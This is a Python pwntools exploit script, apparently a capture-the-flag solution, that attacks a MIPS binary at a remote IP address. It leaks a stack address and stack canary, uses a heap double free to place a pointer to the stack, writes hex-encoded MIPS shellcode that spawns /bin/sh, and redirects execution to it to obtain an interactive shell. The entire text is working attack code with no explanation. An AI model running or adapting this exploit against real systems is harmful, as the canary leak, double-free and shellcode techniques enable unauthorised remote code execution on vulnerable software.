from pwn import*
context.binary = './main'
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('choice',str(ch))
def new(idx,content):
	menu(1)
	p.sendlineafter('id',str(idx))
	p.sendafter('content',content)
def free(index):
	menu(2)
	p.sendlineafter('id!',str(index))
def message(mess):
	menu(3)
	p.sendafter('?',mess)
#p = process('qemu-mipsel -g 1234 -L . ./main.bak',shell=True)
#p = process('qemu-mipsel -L . ./main.bak',shell=True)
p = remote('121.36.166.138',8889)
libc =ELF('./libc-2.23.so')
p.sendafter('motto!','FMYY')
p.recvuntil('gift for you: ')
stack = int(p.recv(10),16) +  0x20
log.info('Stack:\t' + hex(stack))
message('F'*(0x21-4) + 'FMYY')
p.recvuntil('FMYY')
canary = u32(p.recv(3).rjust(4,'\x00'))
log.info('Canary:\t' + hex(canary))
message('\x00'*0x18 + 'FMYY' + p32(0x41) + '\x00')
shellcode  = ""
shellcode += "\xFF\xFF\x10\x04\xAB\x0F\x02\x24"
shellcode += "\x55\xF0\x46\x20\x66\x06\xFF\x23"
shellcode += "\xC2\xF9\xEC\x23\x66\x06\xBD\x23"
shellcode += "\x9A\xF9\xAC\xAF\x9E\xF9\xA6\xAF"
shellcode += "\x9A\xF9\xBD\x23\x21\x20\x80\x01"
shellcode += "\x21\x28\xA0\x03\xCC\xCD\x44\x03"
shellcode += "/bin/sh"
new(1,'FMYY')
new(2,'FMYY')
free(1)
free(2)
free(1)
new(3,p32(stack))
new(4,'\x00')
p.recvuntil('is: ')
heap_base = u32(p.recv(3).ljust(4,'\x00'))
log.info('HEAP:\t' + hex(heap_base))
new(5,shellcode)
new(6,p32(canary) + p32(0) + p32(heap_base + 0x78))
menu(4)
p.interactive()
